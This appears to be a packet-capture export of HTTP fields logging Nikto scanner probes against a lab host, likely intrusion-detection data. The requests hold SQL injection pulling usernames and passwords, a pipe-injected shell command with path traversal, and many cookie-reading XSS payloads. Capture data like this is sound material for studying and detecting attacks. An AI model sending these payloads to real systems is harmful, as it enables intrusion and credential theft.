http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.104															1	http://192.168.1.104/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000690)				/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*
																	Keep-Alive										192.168.1.104									2580						1	http://192.168.1.104/postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000691)				/postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*
																	Keep-Alive										192.168.1.104									2584						1	http://192.168.1.104/cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000692)				/cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,
																	Keep-Alive										192.168.1.104									2586						1	http://192.168.1.104/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000693)				/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=
																	Keep-Alive										192.168.1.104									2588						1	http://192.168.1.104/phpBB2/search.php?search_id=1\\		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000694)				/phpBB2/search.php?search_id=1\\
																	Keep-Alive										192.168.1.104									2590						1	http://192.168.1.104/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000695)				/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*
																	Keep-Alive										192.168.1.104									2592						1	http://192.168.1.104/author.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000696)				/author.asp
																	Keep-Alive										192.168.1.104									2594						1	http://192.168.1.104/horde/test.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000697)				/horde/test.php
																	Keep-Alive										192.168.1.104									2596						1	http://192.168.1.104/imp/horde/test.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000698)				/imp/horde/test.php
																	Keep-Alive										192.168.1.104									2598						1	http://192.168.1.104/cgi-bin/horde/test.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000699)				/cgi-bin/horde/test.php
																	Keep-Alive										192.168.1.104									2600						1	http://192.168.1.104/examples/cookie		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000700)				/examples/cookie
																	Keep-Alive										192.168.1.104									2602						1	http://192.168.1.104/examples/session		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000701)				/examples/session
																	Keep-Alive										192.168.1.104									2604						1	http://192.168.1.104/themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000702)				/themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2606						1	http://192.168.1.104/index.php?option=search&searchword=<script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000703)				/index.php?option=search&searchword=<script>alert(document.cookie);</script>
																	Keep-Alive										192.168.1.104									2608						1	http://192.168.1.104/emailfriend/emailnews.php?id=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000704)				/emailfriend/emailnews.php?id=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2610						1	http://192.168.1.104/emailfriend/emailfaq.php?id=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000705)				/emailfriend/emailfaq.php?id=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2612						1	http://192.168.1.104/emailfriend/emailarticle.php?id=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000706)				/emailfriend/emailarticle.php?id=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2614						1	http://192.168.1.104/administrator/upload.php?newbanner=1&choice=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000707)				/administrator/upload.php?newbanner=1&choice=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2616						1	http://192.168.1.104/administrator/popups/sectionswindow.php?type=web&link=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000708)				/administrator/popups/sectionswindow.php?type=web&link=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2618						1	http://192.168.1.104/administrator/gallery/view.php?path=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000709)				/administrator/gallery/view.php?path=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2620						1	http://192.168.1.104/administrator/gallery/uploadimage.php?directory=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000710)				/administrator/gallery/uploadimage.php?directory=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2622						1	http://192.168.1.104/administrator/gallery/navigation.php?directory=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000711)				/administrator/gallery/navigation.php?directory=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2624						1	http://192.168.1.104/administrator/gallery/gallery.php?directory=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000712)				/administrator/gallery/gallery.php?directory=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2626						1	http://192.168.1.104/index.php?dir=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000713)				/index.php?dir=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2628						1	http://192.168.1.104/https-admserv/bin/index?/<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000714)				/https-admserv/bin/index?/<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2630						1	http://192.168.1.104/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000715)				/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2632						1	http://192.168.1.104/article.cfm?id=1'<script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000716)				/article.cfm?id=1'<script>alert(document.cookie);</script>
																	Keep-Alive										192.168.1.104									2634						1	http://192.168.1.104/upload.php?type=\"<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000717)				/upload.php?type=\"<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2636						1	http://192.168.1.104/soinfo.php?\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000718)				/soinfo.php?\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2638						1	http://192.168.1.104/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000719)				/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;
																	Keep-Alive										192.168.1.104									2640						1	http://192.168.1.104/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000720)				/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.104									2642						1	http://192.168.1.104/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000721)				/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>
																	Keep-Alive										192.168.1.104									2644						1	http://192.168.1.104/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000722)				/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef
																	Keep-Alive										192.168.1.104									2646						1	http://192.168.1.104/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000723)				/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
																	Keep-Alive										192.168.1.104									2648						1	http://192.168.1.104/666%0a%0a<script>alert('Vulnerable');</script>666.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000724)				/666%0a%0a<script>alert('Vulnerable');</script>666.jsp
																	Keep-Alive										192.168.1.104									2650						1	http://192.168.1.104/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000725)				/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2652						1	http://192.168.1.104/servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000726)				/servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2654						1	http://192.168.1.104/servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000727)				/servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2656						1	http://192.168.1.104/servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000728)				/servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2658						1	http://192.168.1.104/servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000729)				/servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2660						1	http://192.168.1.104/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000730)				/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2662						1	http://192.168.1.104/<script>alert('Vulnerable')</script>.shtm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000731)				/<script>alert('Vulnerable')</script>.shtm
																	Keep-Alive										192.168.1.104									2664						1	http://192.168.1.104/<script>alert('Vulnerable')</script>.stm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000732)				/<script>alert('Vulnerable')</script>.stm
																	Keep-Alive										192.168.1.104									2666						1	http://192.168.1.104/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\"><script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000733)				/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\"><script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2668						1	http://192.168.1.104/SiteServer/Knowledge/Default.asp?ctr=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000734)				/SiteServer/Knowledge/Default.asp?ctr=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2670						1	http://192.168.1.104/_mem_bin/formslogin.asp?\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000735)				/_mem_bin/formslogin.asp?\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2672						1	http://192.168.1.104/nosuchurl/><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000736)				/nosuchurl/><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2674						1	http://192.168.1.104/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000737)				/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
																	Keep-Alive										192.168.1.104									2676						1	http://192.168.1.104/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000738)				/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
																	Keep-Alive										192.168.1.104									2678						1	http://192.168.1.104/cgi-bin/redir.exe?URL=http%3A%2F%2Fwww%2Egoogle%2Ecom%2F%0D%0A%0D%0A%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3C%2FSCRIPT%3E		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000739)				/cgi-bin/redir.exe?URL=http%3A%2F%2Fwww%2Egoogle%2Ecom%2F%0D%0A%0D%0A%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3C%2FSCRIPT%3E
																	Keep-Alive										192.168.1.104									2680						1	http://192.168.1.104/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000740)				/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;
																	Keep-Alive										192.168.1.104									2682						1	http://192.168.1.104/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000741)				/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.104									2684						1	http://192.168.1.104/cgi-bin/YaBB/YaBB.cgi?board=BOARD&action=display&num=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000742)				/cgi-bin/YaBB/YaBB.cgi?board=BOARD&action=display&num=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.104									2686						1	http://192.168.1.104/cgi-bin/vq/demos/respond.pl?<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000743)				/cgi-bin/vq/demos/respond.pl?<script>alert('Vulnerable')</script>
